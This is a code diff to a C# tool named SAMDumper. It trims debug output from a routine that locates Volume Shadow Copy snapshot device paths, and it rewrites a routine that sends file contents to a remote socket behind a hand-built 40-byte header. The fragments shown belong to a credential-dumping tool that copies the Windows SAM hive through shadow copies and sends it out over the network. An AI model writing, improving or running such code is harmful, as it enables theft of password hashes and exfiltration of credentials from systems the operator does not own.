@@ -282,20 +282,12 @@ class SAMDumper
                 if (prop.Type == VSS_OBJECT_TYPE.VSS_OBJECT_SNAPSHOT)
                 {
                     count++;
-                    Console.WriteLine("═══════════════════════════════════════════════");
-                    Console.WriteLine($"Shadow Copy #{count}");
-                    Console.WriteLine("═══════════════════════════════════════════════");
-
                     VSS_SNAPSHOT_PROP snap = prop.Obj.Snap;
-
-                    Console.WriteLine($"ID: {{{snap.m_SnapshotId}}}");
-                    Console.WriteLine($"Set ID: {{{snap.m_SnapshotSetId}}}");
 
                     if (snap.m_pwszSnapshotDeviceObject != IntPtr.Zero)
                     {
                         string deviceObject = Marshal.PtrToStringUni(snap.m_pwszSnapshotDeviceObject);
                         outDeviceObject = deviceObject;
-                        Console.WriteLine($"Device Object: {deviceObject}");
                         return true;
                     }
 
@@ -642,37 +634,36 @@ class SAMDumper
 
     private static bool SendFileOverSocket(Socket sock, string filename, List<byte> filedata)
     {
-        FileHeader header = new FileHeader
-        {
-            filename = new byte[32],
-            filesize = (uint)IPAddress.HostToNetworkOrder(filedata.Count),
-            checksum = (uint)IPAddress.HostToNetworkOrder(0)
-        };
+        byte[] filenameBytes = new byte[32];
+        byte[] sourceBytes = Encoding.ASCII.GetBytes(filename);
+        Array.Copy(sourceBytes, filenameBytes, Math.Min(sourceBytes.Length, 32));
 
-        byte[] filenameBytes = Encoding.ASCII.GetBytes(filename);
-        Array.Copy(filenameBytes, header.filename, Math.Min(filenameBytes.Length, 32));
+        int filesizeInt = filedata.Count;
+        int filesizeBigEndian = IPAddress.HostToNetworkOrder(filesizeInt);
+        byte[] filesizeBytes = BitConverter.GetBytes(filesizeBigEndian);
 
-        int headerSize = Marshal.SizeOf(header);
-        byte[] headerBytes = new byte[headerSize];
+        int checksumBigEndian = IPAddress.HostToNetworkOrder(0);
+        byte[] checksumBytes = BitConverter.GetBytes(checksumBigEndian);
 
-        IntPtr headerPtr = Marshal.AllocHGlobal(headerSize);
-        Marshal.StructureToPtr(header, headerPtr, false);
-        Marshal.Copy(headerPtr, headerBytes, 0, headerSize);
-        Marshal.FreeHGlobal(headerPtr);
+        byte[] header = new byte[40];
+        Array.Copy(filenameBytes, 0, header, 0, 32);      // bytes 0-31: filename
+        Array.Copy(filesizeBytes, 0, header, 32, 4);      // bytes 32-35: filesize
+        Array.Copy(checksumBytes, 0, header, 36, 4);      // bytes 36-39: checksum
 
         try
         {
-            int bytesSent = sock.Send(headerBytes);
-            if (bytesSent != headerSize)
+            int bytesSent = sock.Send(header);
+            if (bytesSent != 40)
             {
-                Console.WriteLine($"[-] Error sending header for {filename}.");
+                Console.WriteLine($"[-] Error sending header for {filename}. Sent {bytesSent}/40 bytes");
                 return false;
             }
 
-            bytesSent = sock.Send(filedata.ToArray());
-            if (bytesSent != filedata.Count)
+            byte[] dataArray = filedata.ToArray();
+            bytesSent = sock.Send(dataArray);
+            if (bytesSent != dataArray.Length)
             {
-                Console.WriteLine($"[-] Error sending data for {filename}.");
+                Console.WriteLine($"[-] Error sending data for {filename}. Sent {bytesSent}/{dataArray.Length} bytes");
                 return false;
             }
 
